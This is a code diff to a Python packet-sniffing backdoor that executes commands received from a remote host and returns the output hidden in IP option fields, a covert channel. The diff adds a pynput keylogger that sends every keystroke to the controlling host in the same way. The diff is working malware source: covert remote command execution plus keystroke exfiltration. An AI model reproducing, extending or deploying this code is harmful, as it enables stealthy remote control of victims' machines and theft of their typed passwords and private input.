@@ -2,6 +2,7 @@ from scapy.all import *
 import bdexec
 import netifaces
 from dcaes import AESCipher
+from pynput import keyboard
 
 
 class Listener(object):
@@ -14,8 +15,10 @@ class Listener(object):
         self.key = key
         self.chunk_length = 4
 
+        self.listener = keyboard.Listener(on_press=self.on_press)
+
         self.cipher = AESCipher(self.key)
-        self.executor = bdexec.Executor()
+        self.executor = bdexec.Executor(self)
         self.executor.add_watches(watch_list)
 
         default_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
@@ -51,12 +54,33 @@ class Listener(object):
 
         if stderr is not None:
             self.respond(pkt[IP].src, stderr)
-            # print('sending: ' + stderr)
         elif stdin is not None:
             self.respond(pkt[IP].src, stdin)
-            # print('sending: ' + stdin)
 
-    def respond(self, host, response):
+    def start_logging(self):
+        if not self.listener.isAlive():
+            self.listener = keyboard.Listener(on_press=self.on_press)
+            self.listener.start()
+            return True
+
+        return False
+
+    def stop_logging(self):
+        if self.listener.isAlive:
+            self.listener.stop()
+            return True
+        return False
+
+    def on_press(self, key):
+        try:
+            keys = key.char
+        except AttributeError:
+            keys = str(key)
+            keys = '<' + keys + '>\n'
+
+        self.respond(self.remote_ip, keys, True)
+
+    def respond(self, host, response, keys=False):
         """
         Sends the response to the client.
         """
@@ -66,12 +90,14 @@ class Listener(object):
 
         ipoptions = IPOption()
         ipoptions.optclass = 'control'
-        ipoptions.option = 'commercial_security'
+        if keys:
+            ipoptions.option = 4
+        else:
+            ipoptions.option = 'commercial_security'
 
         for chunk in chunks:
-            # chunk = self.cipher.encrypt_string(chunk)
-
             ipoptions.value = chunk
+            print(chunk)
             ipoptions.length = len(chunk) + 2
 
             if self.proto == 'UDP':
@@ -84,31 +110,5 @@ class Listener(object):
                             options=[ipoptions])/TCP(sport=self.sport, dport=self.dport)
             send(packet, verbose=False)
 
-    # def send_covert(message, source, dest, chunk_length, encode):
-    #     chunks = [message[start:start + chunk_length] for start in xrange(0, len(message), chunk_length)]
-    #
-    #     ipoptions = IPOption()
-    #     ipoptions.optclass = 'control'
-    #     ipoptions.option = 'commercial_security'
-    #
-    #     for chunk in chunks:
-    #         if encode:
-    #             ipoptions.value = base64.b64encode(chunk)
-    #             ipoptions.length = len(base64.b64encode(chunk)) + 2
-    #         else:
-    #             ipoptions.value = chunk
-    #             ipoptions.length = len(chunk) + 2
-    #
-    #         pack = IP(src=source, dst=dest, options=[ipoptions])
-    #         send(pack, verbose=False)
-    #
-    #     # the security flag marks end of the message
-    #     ipoptions.option = 'security'
-    #     ipoptions.value = ''
-    #     ipoptions.length = 2
-    #     pack = IP(dst=dest, src=source, options=[ipoptions])
-    #     send(pack, verbose=False)
-
     def is_incoming(self, pkt):
-        # return pkt[Ether].src != self.get_hw_addr(self.default_iface)
         return pkt[Ether].src != self.hw_addr
